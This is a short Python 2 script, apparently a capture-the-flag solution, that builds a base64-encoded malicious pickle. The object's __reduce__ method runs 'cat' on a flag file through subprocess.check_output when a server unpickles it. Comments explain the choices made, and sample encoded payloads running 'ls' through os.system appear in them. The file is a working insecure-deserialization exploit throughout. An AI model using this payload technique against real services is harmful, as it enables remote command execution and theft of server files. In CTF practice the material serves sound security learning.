#!/usr/bin/python2  
# There are difference in pickled object between Python3 & Python2
import pickle, pickletools
import base64
import os
import subprocess

class anti_pickle_serum(object):
    def __reduce__(self):
        cmd = ["cat", "flag_wIp1b"]
        # 'subprocess.check_output' is used because 'os.system' does not capture output
        # Pickled objects must be a tuple or in a dictionary
        return subprocess.check_output, (cmd,)
        # Gives a '0' when run on webserver as the code of the execution of 'cmd' did not have any errors
        #return os.system, (cmd,)
    
exploit_obj = anti_pickle_serum()
# Object must be inside a dictionary, or a key+value pair is added
# thus making the resultiing pickle different to the original
# e.g., (Y3Bvc2l4CnN5c3RlbQpwMAooUydscycKcDEKdHAyClJwMwou) vs (KGRwMApTJ3NlcnVtJwpwMQpjcG9zaXgKc3lzdGVtCnAyCihTJ2xzJwpwMwp0cDQKUnA1CnMu)
# Pickled objects must be a tuple or in a dictionary
raw_pickle = pickle.dumps({'serum':exploit_obj}, protocol=0)

optimized_pickle = pickletools.optimize(raw_pickle)
pickletools.dis(optimized_pickle)

payload = base64.b64encode(raw_pickle)
print(payload)